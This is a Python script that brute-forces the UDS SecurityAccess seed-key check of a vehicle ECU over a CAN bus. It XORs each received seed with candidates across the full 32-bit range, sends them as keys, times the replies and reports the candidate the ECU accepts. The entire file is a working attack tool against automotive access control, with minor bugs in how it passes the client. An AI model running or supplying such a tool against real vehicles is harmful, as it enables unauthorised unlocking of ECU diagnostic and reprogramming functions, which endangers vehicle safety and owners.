#!/usr/bin/python3

import time
import isotp
import udsoncan
from udsoncan.connections import IsoTPSocketConnection
from udsoncan.client import Client
from udsoncan.exceptions import *
from udsoncan.services import *
from udsoncan import Request, Response

import random, datetime

#udsoncan.setup_logging()

isotp_socket = isotp.socket()
isotp_socket.set_opts(txpad=8, rxpad=8)

class CrackSecurityAccess():
    client = None
    ACCESS_LEVEL = 1

    def __init__(self, client=None, timeout=1):
        if conn:
            self.client = client
        
        self.timeout = timeout

    def start(self):
        if self.client is None:
            raise Exception("conn is None")

        momentTimeSeed = []
        etaTime = "-"
        for xor_cand in range(0x0, 0xffffffff):
            
            seed = self.__getSeed()
            if seed is None:
                raise Exception("seed is None")

            cand = (int.from_bytes(seed, "big") ^ xor_cand).to_bytes(4, "big")
            data = cand
     
            progressTimes = []
            while True:

                response, progressTime = self.__sendKeyAndMesureTime(keyLevel=self.ACCESS_LEVEL+1, data=data)

                progressTimes.append(progressTime)
                if response.code == Response.Code.PositiveResponse:
                    print("\nbingo! xor_cand: %s" % format(xor_cand, '#010x'))
                    return
                elif response.code == 0x36:
                    break

            avg_time = sum(progressTimes) / len(progressTimes)

            if xor_cand % 20 == 0:
                remain = 0xffffffff - xor_cand
                etaTime = datetime.timedelta(seconds=int(avg_time * remain))

            print("\r%s / %s (XORCand: %s, ETA(s): %s)" % (xor_cand, 0xffffffff, format(xor_cand, '#010x'), etaTime), end="")
        
    def __getSeed(self):
        req = Request(SecurityAccess, subfunction=self.ACCESS_LEVEL)
        self.client.send(req.get_payload())
        payload = self.client.wait_frame(timeout=self.timeout)
        response = Response.from_payload(payload)

        if response.service == SecurityAccess and response.code ==  Response.Code.PositiveResponse:
            return response.data[1:]
        else:
            return None

    def __sendKeyAndMesureTime(self, keyLevel, data):
        req = Request(SecurityAccess, subfunction=keyLevel, data=data)
        self.client.send(req.get_payload())

        startTime = time.time()
        payload = self.client.wait_frame(timeout=self.timeout)
        endTime = time.time()

        progressTime = endTime - startTime

        response = Response.from_payload(payload)

        return response, progressTime



if __name__ == '__main__':

    conn = IsoTPSocketConnection('can0', rxid=0x7e8, txid=0x7e0, tpsock=isotp_socket)

    with Client(conn, request_timeout=2) as client:
        try:
            acc = CrackSecurityAccess(conn)
            acc.start()

        except NegativeResponseException as e:
            print('Server refused our request for service %s with code "%s" (0x%02x)' % (e.response.service.get_name(), e.response.code_name, e.response.code))
        except UnexpectedResponseException as e:
            print('Server sent an invalid payload : %s' % e.response.original_payload)
        except TimeoutException as e:
            pass


